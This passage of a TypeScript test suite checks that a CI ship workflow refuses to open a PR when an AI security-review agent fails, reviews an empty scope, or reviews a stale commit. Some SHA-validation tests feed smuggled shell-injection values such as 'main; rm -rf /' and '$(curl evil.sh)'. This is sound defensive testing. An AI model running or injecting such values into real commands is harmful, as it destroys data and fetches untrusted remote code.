import { describe, expect, test } from "bun:test";
import { readFileSync } from "fs";
import { join } from "path";

import {
  reviewIsCurrent,
  rookGateVerdict,
  rookReviewSha,
  rookScopeCommand,
} from "../lib/security-verdict";

/**
 * #129 — the security review can now fail a run.
 *
 * Measured twice in production before this existed: rook returned
 * `{"result":"FAIL"}` with a reproduced HIGH guard bypass, and ship.js
 * returned SHIPPED and opened a PR. The verdict was computed, logged, graded —
 * and read by nothing that could stop anything.
 *
 * ship.js is not importable (the Workflow sandbox has no module loading, #69),
 * so the blocks under test are extracted by marker and executed with stubs,
 * the same way test/verify-fanout.test.ts and
 * test/workflow-security-integration.test.ts do it.
 */

const REPO_ROOT = join(import.meta.dir, "..");
const SHIP_PATH = join(REPO_ROOT, "workflows", "ship.js");
const shipSource = readFileSync(SHIP_PATH, "utf-8");

/**
 * Run ship.js's security decision block with an arbitrary set of module-scope
 * names.
 *
 * `with` over a Proxy rather than a parameter list. The block reads several
 * module-scope values, and which ones is an implementation detail that moves:
 * #169 added the review-currency comparison to it, and a parameter list both
 * has to guess the new names and throws outright if the block declares one of
 * them with `const`. Unknown identifiers fall through to the real globals, so
 * `JSON`, `String` and friends still resolve, and a name nothing supplies is
 * `undefined` — which throws where it is used rather than passing quietly.
 *
 * The block ends in `return { status: 'SHIP_FAILED', ... }` on a refusal and
 * falls through to undefined when the run may proceed.
 */
function runDecisionBlock(scope: Record<string, unknown>) {
  const block = sliceBlock(DECISION_START, DECISION_END);
  const sandbox = new Proxy(scope, {
    has: () => true,
    get: (target, key) => {
      if (key === Symbol.unscopables) return undefined;
      return key in target
        ? target[key as string]
        : (globalThis as unknown as Record<string, unknown>)[key as string];
    },
  });
  const factory = new Function(
    "__scope__",
    `return (async function () { with (__scope__) {\n${block}\nreturn undefined\n} })()`,
  );
  return factory(sandbox) as Promise<Record<string, unknown> | undefined>;
}

/**
 * The names the decision block reads, defaulting to a run that may ship: a
 * passing verify, a passing security verdict, and a review pinned to the
 * commit the branch ends at. A test about one of those sets only that one, so
 * it is never also quietly asserting something else.
 *
 * `tested`/`head` drive the review-currency inputs under every name the block
 * could reasonably read them by, all consistent with each other, so this
 * harness does not pin ship.js's choice of local variable.
 */
function decisionScope(
  logs: string[],
  overrides: { tested?: unknown; head?: unknown } & Record<string, unknown> = {},
): Record<string, unknown> {
  const tested = "tested" in overrides ? overrides.tested : SHA;
  const head = "head" in overrides ? overrides.head : SHA;
  const rest = { ...overrides };
  delete rest.tested;
  delete rest.head;
  const currency = inlinedReviewIsCurrent(tested, head);
  return {
    log: (m: unknown) => logs.push(String(m)),
    verifyResult: { result: "PASS" },
    securityVerdict: { spawned: true, verdict: "PASS", failures: [] as string[] },
    shipBranch: "169-deep-modules",
    ISSUE: 169,
    SLUG: "pai-harness-169",
    WORK_DIR: "/tmp/work",
    reviewIsCurrent: inlinedReviewIsCurrent,
    reviewCurrency: currency,
    securityCurrency: currency,
    currency,
    testedSha: tested,
    headSha: head,
    reviewSha: tested,
    buildCommit: head,
    ...rest,
  };
}

function sliceBlock(startMarker: string, endMarker: string): string {
  const start = shipSource.indexOf(startMarker);
  const end = shipSource.indexOf(endMarker);
  if (start === -1 || end === -1) {
    throw new Error(`ship.js is missing the ${startMarker} / ${endMarker} markers`);
  }
  return shipSource.slice(start + startMarker.length, end);
}

const SECURITY_START = "// ──── ROOK-SECURITY-START ────";
const SECURITY_END = "// ──── ROOK-SECURITY-END ────";
const DECISION_START = "// ──── SECURITY-DECISION-START ────";
const DECISION_END = "// ──── SECURITY-DECISION-END ────";
const FANOUT_START = "// ──── VERIFY-FANOUT-START ────";
const FANOUT_END = "// ──── VERIFY-FANOUT-END ────";
const CURRENCY_START = "// ──── REVIEW-CURRENCY-START ────";
const CURRENCY_END = "// ──── REVIEW-CURRENCY-END ────";

/** The inlined copies ship.js actually runs. */
const inlined = new Function(
  `${sliceBlock(SECURITY_START, SECURITY_END)}
   return { rookReviewSha, rookScopeCommand, rookGateVerdict }`,
)() as {
  rookReviewSha: typeof rookReviewSha;
  rookScopeCommand: typeof rookScopeCommand;
  rookGateVerdict: typeof rookGateVerdict;
};

/**
 * ship.js's inlined `reviewIsCurrent`, extracted by marker.
 *
 * Module scope on purpose: if the REVIEW-CURRENCY markers are not in ship.js,
 * `sliceBlock` throws here and every test in this file fails to load. The
 * alternative — resolving the copy lazily and skipping when it is absent —
 * would turn "ship.js lost its staleness check" into a quiet green run, which
 * is the exact shape .claude/rules/checks-must-be-able-to-fail.md is about.
 *
 * The copy is compiled against the ROOK-SECURITY block because it calls
 * `rookReviewSha`, which lives there. When the currency block is nested inside
 * ROOK-SECURITY the security block already carries it; when it is a separate
 * region it is compiled in a nested function scope, so its own `const` and
 * `function` declarations cannot collide with the security block's while still
 * closing over them.
 */
const inlinedReviewIsCurrent: typeof reviewIsCurrent = (() => {
  const securityBlock = sliceBlock(SECURITY_START, SECURITY_END);
  const currencyBlock = sliceBlock(CURRENCY_START, CURRENCY_END);
  const body = securityBlock.includes(currencyBlock)
    ? `${securityBlock}\nreturn reviewIsCurrent`
    : `${securityBlock}\nreturn (function () {${currencyBlock}\nreturn reviewIsCurrent})()`;
  const fn = new Function(body)();
  if (typeof fn !== "function") {
    throw new Error(
      "ship.js's REVIEW-CURRENCY block does not define reviewIsCurrent — " +
        "the agreement matrix below would be comparing nothing",
    );
  }
  return fn as typeof reviewIsCurrent;
})();

const SHA = "3192a75c4f1e2b8d9a0c5e6f7081a2b3c4d5e6f7";
/** A different real commit — the #164 branch tip. */
const OTHER_SHA = "ef998b73c4f1e2b8d9a0c5e6f7081a2b3c4d5e6f";
const GOOD_SCOPE = { exitCode: 0, files: ["workflows/ship.js", "lib/security-verdict.ts"] };

// ── AC-1 ────────────────────────────────────────────────────────────────

describe("AC-1: a rook FAIL stops the run", () => {
  /**
   * Execute the decision block with the module-scope names ship.js gives it,
   * over a review that is current — so these tests are about the rook verdict
   * and nothing else. Staleness has its own describe below.
   */
  function decide(opts: {
    verifyResult: unknown;
    securityVerdict: { spawned: boolean; verdict: string; failures: string[] };
  }) {
    const logs: string[] = [];
    const result = runDecisionBlock(
      decisionScope(logs, {
        verifyResult: opts.verifyResult,
        securityVerdict: opts.securityVerdict,
        shipBranch: "129-deep-modules",
        ISSUE: 129,
        SLUG: "pai-harness-129",
      }),
    );
    return { result, logs };
  }

  const PASSING = { spawned: true, verdict: "PASS", failures: [] as string[] };

  test("rook FAIL returns SHIP_FAILED", async () => {
    const { result, logs } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: {
        spawned: true,
        verdict: "FAIL",
        failures: ["guard bypass in gates/run-gate.ts:120"],
      },
    });
    const out = await result;
    expect(out?.status, "a FAIL security verdict let the run continue").toBe("SHIP_FAILED");
    expect(String(out?.reason)).toContain("guard bypass in gates/run-gate.ts:120");
    expect(logs.some(l => /guard bypass in gates\/run-gate\.ts:120/.test(l))).toBe(true);
  });

  test("the verdict object travels with the refusal", async () => {
    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: { spawned: true, verdict: "FAIL", failures: ["x"] },
    });
    const out = await result;
    expect((out?.security as Record<string, unknown>)?.verdict).toBe("FAIL");
    expect(out?.issue).toBe(129);
  });

  test("a PASS verdict falls through so the run can continue", async () => {
    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: PASSING,
    });
    expect(await result, "a passing security review stopped the run").toBeUndefined();
  });

  test("the fail-closed default blocks a run where security never ran", async () => {
    // ship.js's REAL initialiser, executed — not a value this test made up.
    // If the fan-out throws, or a future edit forgets to assign it, this is
    // what the decision point sees, and it must refuse. Asserting a
    // hand-written copy here would pass even if ship.js initialised to PASS.
    const initialiser = new Function(
      `${sliceBlock("// ──── SECURITY-DEFAULT-START ────", "// ──── SECURITY-DEFAULT-END ────")}
       return securityVerdict`,
    )() as { spawned: boolean; verdict: string; failures: string[] };

    expect(initialiser.verdict, "ship.js starts the run with security already passed").toBe("FAIL");
    expect(initialiser.spawned).toBe(false);
    expect(initialiser.failures.length).toBeGreaterThan(0);

    const { result } = decide({
      verifyResult: { result: "PASS" },
      securityVerdict: initialiser,
    });
    expect((await result)?.status).toBe("SHIP_FAILED");
  });

  test("the decision reads verifyResult at the same point", () => {
    // AC-1 places the security decision beside the verify decision rather than
    // in a second, later place that a future edit could return before.
    const block = sliceBlock(DECISION_START, DECISION_END);
    expect(block).toContain("verifyResult?.result");
    expect(block).toContain("securityVerdict");
  });

  test("no PR step is invoked after the refusal", () => {
    // Structural, because the PR step is 170 lines further down and cannot be
    // stubbed into the extracted block: assert the refusal's `return` comes
    // first in the file, so nothing between it and the PR step can run.
    const refusal = shipSource.indexOf(DECISION_END);
    const prStep = shipSource.indexOf("record-env-and-pr");
    expect(prStep, "the PR step label moved — this guard no longer checks anything")
      .toBeGreaterThan(-1);
    expect(
      refusal,
      "the security decision now happens AFTER the PR is opened, which is the bug",
    ).toBeLessThan(prStep);
  });
});

// ── AC-2 ────────────────────────────────────────────────────────────────

describe("AC-2: the review scope is the commit SHA", () => {
  test("review scope is the commit SHA, not a worktree's HEAD", async () => {
    const prompts = await runFanoutPrompts();
    const rookPrompt = prompts.find(p => /Security review/.test(p)) || "";
    expect(rookPrompt, "rook's prompt does not name the commit under review").toContain(SHA);
    expect(
      rookPrompt,
      "rook is still scoped to origin/main...HEAD of whatever worktree it was given — " +
        "that diff was EMPTY on both production runs",
    ).not.toContain("origin/main...HEAD");
  });

  test("the scope command pins git to the workflow-supplied SHA", () => {
    const cmd = rookScopeCommand("/p", "/h", SHA, "/w/scope.json");
    expect(cmd).toContain(`--sha ${SHA}`);
    expect(cmd).toContain("/h/scripts/rook-review-scope.ts");
    expect(cmd).toContain(`--out ${shellQuote("/w/scope.json")}`);
    // A path with a space is the case unquoted interpolation breaks on first,
    // and it needs no attacker — PROJECT_ROOT is wherever the repo is checked
    // out. Asserted against shellQuote's own output so the expectation tracks
    // ship.js's quoting rather than restating it.
    const spaced = rookScopeCommand("/My Projects/p", "/h", SHA, "/w/s.json");
    expect(spaced).toContain(`--project ${shellQuote("/My Projects/p")}`);
    expect(spaced).toContain(`cd ${shellQuote("/My Projects/p")}`);
  });

  test("rookReviewSha accepts a SHA and refuses anything else", () => {
    expect(rookReviewSha("3192a75")).toBe("3192a75");
    expect(rookReviewSha("3192A75")).toBe("3192a75");
    expect(rookReviewSha(" 3192a75 ")).toBe("3192a75");
    for (const bad of ["HEAD", "main", "abc", "", null, undefined, 42, {}, "3192a75; rm -rf /"]) {
      expect(rookReviewSha(bad), `${JSON.stringify(bad)} was accepted as a review SHA`).toBeNull();
    }
  });

  test("the scope command refuses to be built from a non-SHA", () => {
    for (const bad of ["HEAD", "main; rm -rf /", "", "$(curl evil.sh)"]) {
      expect(() => rookScopeCommand("/p", "/h", bad, "/w/s.json")).toThrow(/not a commit SHA/i);
    }
  });
});

// ── AC-3 / AC-6 ─────────────────────────────────────────────────────────

describe("AC-3: an empty scope blocks the run", () => {
  test("empty scope blocks even when rook returns PASS", () => {
    const v = rookGateVerdict({ exitCode: 0, files: [] }, { result: "PASS" });
    expect(v.verdict, "rook reviewed nothing and the run was allowed to proceed").toBe("FAIL");
    expect(v.failures.join(" ")).toMatch(/empty/i);
  });

  test("a non-empty scope with a rook PASS is the only way through", () => {
    expect(rookGateVerdict(GOOD_SCOPE, { result: "PASS" })).toEqual({
      spawned: true,
      verdict: "PASS",
      failures: [],
    });
  });

  test("the scope script itself refuses an empty diff", () => {
    // The other half: the workflow-side check above is only meaningful if the
    // script can actually produce exitCode != 0. Covered end-to-end against a
    // real git repository in test/rook-review-scope.test.ts.
    const scopeSource = readFileSync(join(REPO_ROOT, "scripts", "rook-review-scope.ts"), "utf-8");
    expect(scopeSource).toContain("REFUSE_EXIT");
  });
});

describe("AC-6: the scope determination fails closed", () => {
  const MALFORMED: Array<[string, unknown]> = [
    ["nothing at all", undefined],
    ["null", null],
    ["a string instead of a report", "ok"],
    ["a report with no exitCode", { files: ["a.ts"] }],
    ["a non-zero exitCode", { exitCode: 1, files: ["a.ts"] }],
    ["exitCode as a string", { exitCode: "0", files: ["a.ts"] }],
    ["files missing", { exitCode: 0 }],
    ["files null", { exitCode: 0, files: null }],
    ["files as a string", { exitCode: 0, files: "a.ts" }],
    ["files as an object", { exitCode: 0, files: { 0: "a.ts" } }],
    ["files empty", { exitCode: 0, files: [] }],
    // A list whose entries are not usable paths is the same absence of a
    // reviewed scope as an empty list, and `files.length` cannot tell them
    // apart. Found by security review of this change: the earlier draft
    // filtered to non-blank strings before counting and this one dropped it,
    // which is a fail-open inside a function whose contract is to fail closed
    // everywhere.
    ["files containing only an empty string", { exitCode: 0, files: [""] }],
    ["files containing only whitespace", { exitCode: 0, files: ["   ", "\t"] }],
    ["files containing nulls", { exitCode: 0, files: [null, null] }],
    ["files containing numbers", { exitCode: 0, files: [1, 2] }],
    ["files containing nested arrays", { exitCode: 0, files: [["a.ts"]] }],
  ];

  for (const [label, scope] of MALFORMED) {
    test(`fails closed on a malformed scope report — ${label}`, () => {
      const v = rookGateVerdict(scope, { result: "PASS" });
      expect(
        v.verdict,
        `${label} was treated as a successful non-empty scope`,
      ).toBe("FAIL");
      expect(v.failures.length).toBeGreaterThan(0);
    });
  }

  test("a usable path beside an unusable one is still a scope", () => {
    // The positive control for the filter above. A stricter rule — "every
    // entry must be a non-blank string" — would reject this, and then the
    // whole matrix would pass for a reason that has nothing to do with
    // emptiness. git produces clean paths; the filter exists to stop a
    // report of nothing from counting as a report of something.
    const v = rookGateVerdict({ exitCode: 0, files: ["", "lib/a.ts"] }, { result: "PASS" });
    expect(v.verdict).toBe("PASS");
  });

  test("a missing rook result is a FAIL, not a skip", () => {
    for (const rook of [undefined, null, {}, { result: "MAYBE" }, { result: "SKIP" }]) {
      const v = rookGateVerdict(GOOD_SCOPE, rook);
      expect(v.verdict, `rook returning ${JSON.stringify(rook)} was treated as a pass`).toBe("FAIL");
    }
  });

  test("a rook FAIL with no detail still names something actionable", () => {
    // gates/SCHEMA-GUIDE.md: a FAIL verdict must carry a non-empty failures
    // list. A FAIL nobody can act on blocks the run without saying what to fix.
    for (const rook of [
      { result: "FAIL" },
      { result: "FAIL", failures: [] },
      { result: "FAIL", failures: null },
      { result: "FAIL", failures: "injection in lib/a.ts" },
    ]) {
      const v = rookGateVerdict(GOOD_SCOPE, rook);
      expect(v.verdict).toBe("FAIL");
      expect(v.failures.length, JSON.stringify(rook)).toBeGreaterThan(0);
      for (const f of v.failures) expect(typeof f).toBe("string");
    }
  });

  test("rook's own failure strings are carried through", () => {
    const v = rookGateVerdict(GOOD_SCOPE, {
      result: "FAIL",
      failures: ["secret logged at gates/run-gate.ts:120", "unvalidated path join"],
    });
    expect(v.failures).toEqual([
      "secret logged at gates/run-gate.ts:120",
      "unvalidated path join",
    ]);
  });

  test("spawned reflects whether rook actually returned anything", () => {
    expect(rookGateVerdict(GOOD_SCOPE, null).spawned).toBe(false);
    expect(rookGateVerdict(GOOD_SCOPE, { result: "PASS" }).spawned).toBe(true);
  });
});

// ── AC-4 ────────────────────────────────────────────────────────────────

describe("AC-4: the verdict is recorded in workflow-state.json", () => {
  test("records the security verdict in workflow-state", async () => {
    // The write itself is exercised end-to-end against a real file in
    // test/record-security-verdict.test.ts. What this asserts is the half that
    // lives in the workflow: the recorder is invoked, pointed at this run's
    // state file, and told the verdict the WORKFLOW computed — not one an
    // agent restated back.
    const { done, prompts } = runFanout({
      rook: { result: "FAIL", failures: ["guard bypass"] },
    });
    await done;
    const record = prompts.find(p => /record-security-verdict\.ts/.test(p)) || "";
    expect(record, "nothing in the fan-out records the verdict").not.toBe("");
    expect(record).toContain(`--state ${shellQuote("/tmp/work/workflow-state.json")}`);
    expect(record).toContain(`--verdict ${shellQuote("FAIL")}`);
    expect(record).toContain(`--spawned ${shellQuote("true")}`);
    expect(record).toContain(`--findings ${shellQuote("/tmp/work/rook-findings.json")}`);
  });

  test("every path in the record command is shell-quoted", async () => {
    // Not because any of these is agent-reported — they are workflow
    // arguments — but because ship.js:377 is the record of an unquoted path
    // that was safe until what fed it changed, and a project root containing
    // a space is the ordinary case that breaks first. Written against
    // shellQuote's output rather than a literal `'`, so the assertion follows
    // the quoting ship.js actually uses.
    const { done, prompts } = runFanout();
    await done;
    const record = prompts.find(p => /record-security-verdict\.ts/.test(p)) || "";
    for (const flag of ["--state", "--findings", "--scope", "--verdict", "--spawned"]) {
      const value = record.match(new RegExp(`${flag} (\\S+)`))?.[1];
      expect(value, `${flag} is missing from the record command`).toBeDefined();
      expect(value!.startsWith("'") && value!.endsWith("'"), `${flag} ${value} is unquoted`).toBe(true);
    }
  });

  test("the recorded verdict is the workflow's, not rook's bare answer", async () => {
    // rook says PASS; the scope was empty, so the run is a FAIL and the
    // artefact must say FAIL. A record that echoed rook would claim this run
    // was security-reviewed when it reviewed nothing.
    const { done, prompts } = runFanout({
      rook: { result: "PASS" },
      scope: { exitCode: 0, files: [] },
    });
    await done;
    const record = prompts.find(p => /record-security-verdict\.ts/.test(p)) || "";
    expect(record).toContain(`--verdict ${shellQuote("FAIL")}`);
  });

  test("the record step runs for a PASS as well as a FAIL", async () => {
    const { done, labels } = runFanout({ rook: { result: "PASS" } });
    await done;
    expect(
      labels,
      "a passing review leaves no record, so the artefact cannot say security ran",
    ).toContain("record-security");
  });

  test("the record step runs when rook FAILs", async () => {
    const { done, labels } = runFanout({ rook: { result: "FAIL", failures: ["boom"] } });
    await done;
    expect(labels).toContain("record-security");
  });

  test("agents.rook.failures survives the schema", async () => {
    // Zod strips undeclared keys. Without `failures` on AgentSchema a rook FAIL
    // round-trips as a verdict with no reasons attached.
    const { WorkflowStateSchema } = await import("../gates/schema");
    const parsed = WorkflowStateSchema.partial().safeParse({
      agents: {
        rook: { spawned: true, verdict: "FAIL", failures: ["a", "b"] },
      },
    });
    expect(parsed.success, JSON.stringify((parsed as { error?: unknown }).error)).toBe(true);
    expect(
      (parsed as { data: { agents: { rook: { failures?: string[] } } } }).data.agents.rook.failures,
    ).toEqual(["a", "b"]);
  });

  test("agents.rook.failures rejects a bare string", async () => {
    const { WorkflowStateSchema } = await import("../gates/schema");
    const parsed = WorkflowStateSchema.partial().safeParse({
      agents: { rook: { spawned: true, verdict: "FAIL", failures: "one long prose blob" } },
    });
    expect(parsed.success).toBe(false);
  });
});

// ── AC-5 ────────────────────────────────────────────────────────────────

describe("AC-5: the standard no longer makes security conditional on size", () => {
  const spec = readFileSync(join(REPO_ROOT, "specs", "HARNESS-STANDARD.md"), "utf-8");

  for (const [label, pattern] of [
    ["the §5 process list", /If M\+ size .*Rook/],
    ["the Quality bar line", /Rook PASS if M\+/],
    ["the VERIFICATION mermaid node", /Rook security \(if M\+\)/],
    ["the phase table", /Quinn\/Rook conditional/],
  ] as Array<[string, RegExp]>) {
    test(`${label} no longer gates the security review on size`, () => {
      expect(spec.match(new RegExp(pattern, "g")) || []).toEqual([]);
    });
  }

  test("the standard still mentions the security review at all", () => {
    // The over-fix guard: deleting every mention of Rook would satisfy the four
    // assertions above while removing the requirement entirely.
    expect(spec).toMatch(/Rook/);
    expect(spec).toMatch(/every (build )?cycle|always/i);
  });
});

// ── the inlined copy must not drift from the library ────────────────────

describe("ship.js's inlined helpers match lib/security-verdict.ts", () => {
  // Same reasoning as test/workflow-security-integration.test.ts AC-4: ship.js
  // cannot import, so it carries copies, and a copy that has drifted is how a
  // fix lands in one place and not the other. computeACHash already did this
  // once in this repo — the lib sorted its input and the inline copy did not.

  test("rookReviewSha agrees on every input", () => {
    for (const v of ["3192a75", "3192A75", " abc1234 ", "HEAD", "", null, undefined, 7, {}, []]) {
      expect(inlined.rookReviewSha(v), JSON.stringify(v)).toEqual(rookReviewSha(v));
    }
  });

  test("rookScopeCommand agrees", () => {
    expect(inlined.rookScopeCommand("/p", "/h", SHA, "/w/s.json")).toBe(
      rookScopeCommand("/p", "/h", SHA, "/w/s.json"),
    );
    expect(() => inlined.rookScopeCommand("/p", "/h", "HEAD", "/w/s.json")).toThrow();
  });

  test("rookGateVerdict agrees on every scope/rook pair", () => {
    const scopes: unknown[] = [
      undefined, null, "ok", {}, { exitCode: 0 }, { exitCode: 1, files: ["a"] },
      { exitCode: 0, files: [] }, { exitCode: 0, files: "a" }, GOOD_SCOPE,
    ];
    const rooks: unknown[] = [
      undefined, null, {}, { result: "PASS" }, { result: "FAIL" },
      { result: "FAIL", failures: ["a", "b"] }, { result: "SKIP" },
    ];
    for (const s of scopes) {
      for (const r of rooks) {
        expect(
          inlined.rookGateVerdict(s, r),
          `drift at scope=${JSON.stringify(s)} rook=${JSON.stringify(r)}`,
        ).toEqual(rookGateVerdict(s, r));
      }
    }
  });
});

// ── #169 ────────────────────────────────────────────────────────────────

/**
 * The one input matrix. Every #169 test below — the library, ship.js's inlined
 * copy, and the parity comparison between them — runs over this, so "the two
 * agree" cannot be satisfied by the two being asked different questions.
 *
 * `current` is the expected answer, and the positive rows matter as much as
 * the negative ones: a `reviewIsCurrent` that returned `false` unconditionally
 * would satisfy every refusal case in the file.
 */
const CURRENCY_MATRIX: Array<[string, unknown, unknown, boolean]> = [
  ["the same full SHA", SHA, SHA, true],
  ["head abbreviates tested", SHA, SHA.slice(0, 8), true],
  ["tested abbreviates head", SHA.slice(0, 8), SHA, true],
  ["the same SHA in different case", SHA.toUpperCase(), SHA, true],
  ["the same SHA with whitespace", ` ${SHA} `, SHA, true],
  // The #164 run, exactly: a real review, pinned to a commit the remediation
  // round replaced. 236 insertions and 254 deletions across all four reviewed
  // files, and nothing compared the two values.
  ["the #164 mismatch", "3fe336f1", OTHER_SHA, false],
  ["two different full SHAs", SHA, OTHER_SHA, false],
  ["a short prefix that is not shared", SHA.slice(0, 7), OTHER_SHA.slice(0, 7), false],
  ["tested missing", undefined, SHA, false],
  ["tested null", null, SHA, false],
  ["tested is a ref name", "HEAD", SHA, false],
  ["tested is empty", "", SHA, false],
  ["tested is a number", 42, SHA, false],
  ["tested is an object", {}, SHA, false],
  ["tested carries a command", "3192a75; rm -rf /", SHA, false],
  ["head missing", SHA, undefined, false],
  ["head null", SHA, null, false],
  ["head is a ref name", SHA, "HEAD", false],
  ["head is empty", SHA, "", false],
  ["head is an array", SHA, [SHA], false],
  ["both missing", undefined, undefined, false],
  ["both malformed", "HEAD", "main", false],
];

describe("#169 stale commit: a review pinned to a superseded commit is not current", () => {
  for (const [label, tested, head, expected] of CURRENCY_MATRIX) {
    test(`${label} → ${expected ? "current" : "stale"}`, () => {
      const lib = reviewIsCurrent(tested, head);
      expect(lib.current, `${label}: the library read this as ${lib.current}`).toBe(expected);
      // A refusal that cannot say why is a refusal nobody can act on. And a
      // `reason` on a PASS would let a caller that checks truthiness of the
      // reason refuse a current review.
      if (expected) {
        expect(lib.reason, `${label}: a current review carried a reason`).toBeNull();
      } else {
        expect(typeof lib.reason, `${label}: a stale review carried no reason`).toBe("string");
        expect(lib.reason!.length).toBeGreaterThan(0);
      }
    });
  }

  test("the refusal names both commits, so it says what was reviewed and what shipped", () => {
    const r = reviewIsCurrent("3fe336f1", OTHER_SHA);
    expect(r.current).toBe(false);
    expect(r.reason).toContain("3fe336f1");
    expect(r.reason).toContain(OTHER_SHA.toLowerCase());
  });

  test("nothing here throws — a throw on this path is a refusal the caller can swallow", () => {
    for (const bad of [Symbol.iterator, () => {}, new Date(), NaN, Infinity]) {
      expect(() => reviewIsCurrent(bad as unknown, SHA)).not.toThrow();
      expect(() => reviewIsCurrent(SHA, bad as unknown)).not.toThrow();
    }
  });

  test("it is built on rookReviewSha rather than a second SHA rule", () => {
    // The brief's reason for putting this beside rookReviewSha: two different
    // notions of "is this a SHA" in one file is how the pair drifts. Anything
    // rookReviewSha refuses must be stale, in both positions.
    for (const bad of ["HEAD", "main", "abc", "", "3192a75; rm -rf /"]) {
      expect(rookReviewSha(bad)).toBeNull();
      expect(reviewIsCurrent(bad, SHA).current, `${bad} was accepted as a tested SHA`).toBe(false);
      expect(reviewIsCurrent(SHA, bad).current, `${bad} was accepted as a head SHA`).toBe(false);
    }
  });
});

describe("#169 refusal path: a stale review stops the run", () => {
  test("a stale review returns SHIP_FAILED prefixed SECURITY_REVIEW_STALE", async () => {
    const logs: string[] = [];
    const out = await runDecisionBlock(
      // Everything else passes. The ONLY thing wrong with this run is that the
      // review is pinned to a commit the branch no longer ends at — which is
      // precisely the run that reported SHIPPED on #164.
      decisionScope(logs, { tested: "3fe336f1", head: OTHER_SHA }),
    );
    expect(out?.status, "a stale security review let the run reach the PR step").toBe("SHIP_FAILED");
    expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
    expect(String(out?.reason)).toContain("3fe336f1");
    expect(out?.issue).toBe(169);
    expect(out?.slug).toBe("pai-harness-169");
    expect(logs.some(l => /SECURITY_REVIEW_STALE/.test(l)), "the refusal was never logged").toBe(true);
  });

  test("a missing testedSha is stale, not trusted because the verdict says PASS", async () => {
    for (const tested of [undefined, null, "", "HEAD", {}]) {
      const out = await runDecisionBlock(decisionScope([], { tested }));
      expect(out?.status, `testedSha=${JSON.stringify(tested)} was waved through`).toBe("SHIP_FAILED");
      expect(String(out?.reason)).toStartWith("SECURITY_REVIEW_STALE");
    }
  });

  test("an unreadable head commit is stale too", async () => {
    for (const head of [undefined, null, "", "HEAD"]) {
      const out = await runDecisionBlock(decisionScope([], { head }));
      expect(out?.status, `headSha=${JSON.stringify(head)} was waved through`).toBe("SHIP_FAILED");
    }
  });

  test("the positive control: a current review still falls through", async () => {
    // Without this, a decision block that refused unconditionally would
    // satisfy every assertion above.
    expect(
      await runDecisionBlock(decisionScope([])),
      "a current, passing review was refused — the staleness check refuses everything",
    ).toBeUndefined();
    // And an abbreviation of the same commit is the same commit. The two
    // values arrive from different places — testedSha through an agent, the
    // head SHA from `git rev-parse` — and either may be shortened.
    expect(
      await runDecisionBlock(decisionScope([], { tested: SHA, head: SHA.slice(0, 7) })),
    ).toBeUndefined();
  });

  test("the staleness refusal uses the same return path as the verdict refusal", async () => {
    const stale = await runDecisionBlock(decisionScope([], { tested: SHA, head: OTHER_SHA }));
    const failed = await runDecisionBlock(
      decisionScope([], {
        securityVerdict: { spawned: true, verdict: "FAIL", failures: ["guard bypass"] },
      }),
    );
    expect(Object.keys(stale!).sort(), "the two refusals return different shapes").toEqual(
      Object.keys(failed!).sort(),
    );
    expect(stale!.status).toBe(failed!.status);
  });

  test("the mismatch is not downgraded to a logged warning", () => {
    // AC-2. The shape this must not have: `securityVerdict.verdict === 'PASS'
    // ? log(...) : ...` — a ternary that turns the comparison into a note in
    // the transcript. Asserted over the whole file, not the block, because
    // moving it one line outside the markers would be the same bug.
    expect(
      shipSource.match(/securityVerdict\.verdict\s*===\s*'PASS'\s*\?/g) || [],
      "ship.js downgrades the security decision through a ternary",
    ).toEqual([]);
  });

  test("the staleness check runs before the PR step", () => {
    // Same structural guard as AC-1's: the PR step is far below and cannot be
    // stubbed into the extracted block, so assert the refusal comes first in
    // the file.
    const refusal = shipSource.indexOf("SECURITY_REVIEW_STALE");
    const prStep = shipSource.indexOf("record-env-and-pr");
    expect(refusal, "ship.js has no SECURITY_REVIEW_STALE refusal").toBeGreaterThan(-1);
    expect(prStep).toBeGreaterThan(-1);
    expect(refusal, "the staleness check happens after the PR is opened").toBeLessThan(prStep);
  });

  test("the head commit is re-read from git, not reused from the commit step", () => {
    // AC-1's "re-reads". The commit step's reply is the value that was already
    // stale on #164 — the point of this change is a second look at the branch
    // taken beside the decision, after the remediation rounds have run.
    const probe = shipSource.slice(
      shipSource.indexOf("// ──── REVIEW-CURRENCY-PROBE-START ────"),
      shipSource.indexOf("// ──── REVIEW-CURRENCY-PROBE-END ────"),
    );
    expect(probe, "ship.js has no review-currency probe").not.toBe("");
    expect(probe).toContain("git rev-parse HEAD");
    expect(probe, "the probe does not read the recorded review SHA back").toContain("testedSha");
    expect(probe).toContain("workflow-state.json");
    const required = probe.match(/required:\s*\[([^\]]*)\]/)?.[1] ?? "";
    expect(required, `the probe's required fields were: ${required}`).toContain("headSha");
  });
});

describe("#169 parity: the inlined copy matches lib/security-verdict.ts", () => {
  // Same reasoning as the rookGateVerdict agreement test above, and the same
  // history: computeACHash's extracted function had never matched its inlined
  // copy, because nothing compared them.

  for (const [label, tested, head] of CURRENCY_MATRIX) {
    test(`agrees on ${label}`, () => {
      expect(inlinedReviewIsCurrent(tested, head), `drift at ${label}`).toEqual(
        reviewIsCurrent(tested, head),
      );
    });
  }

  test("the reasons agree word for word, not just the verdicts", () => {
    // A copy that refuses for the same inputs with a different explanation is
    // still drift, and it is the kind that reaches an operator rather than a
    // test.
    for (const [, tested, head] of CURRENCY_MATRIX) {
      expect(inlinedReviewIsCurrent(tested, head).reason).toBe(reviewIsCurrent(tested, head).reason);
    }
  });

  test("the library exports it exactly once, beside the other two", () => {
    // AC-3: declared in the library rather than living only in the workflow,
    // which is what makes the comparison above possible at all.
    const lib = readFileSync(join(REPO_ROOT, "lib", "security-verdict.ts"), "utf-8");
    expect((lib.match(/export function reviewIsCurrent/g) || []).length).toBe(1);
    expect(lib).toContain("export function rookGateVerdict");
    expect(lib).toContain("export function rookReviewSha");
  });
});

// ── fan-out harness shared by the AC-2 and AC-4 tests ───────────────────

/**
 * ship.js's own `shellQuote`, extracted rather than reimplemented.
 *
 * The fan-out block quotes the paths it hands to the record step, and a stub
 * that quoted differently from production would make these tests agree with
 * something that does not run. Extraction also fails loudly if the function is
 * renamed, instead of silently testing a local copy of the old one.
 */
const shellQuote: (word: unknown) => string = (() => {
  const match = shipSource.match(/function shellQuote\(word\) \{[\s\S]*?\n\}/);
  if (!match) {
    throw new Error("ship.js no longer defines shellQuote(word) — this harness extracts it by name");
  }
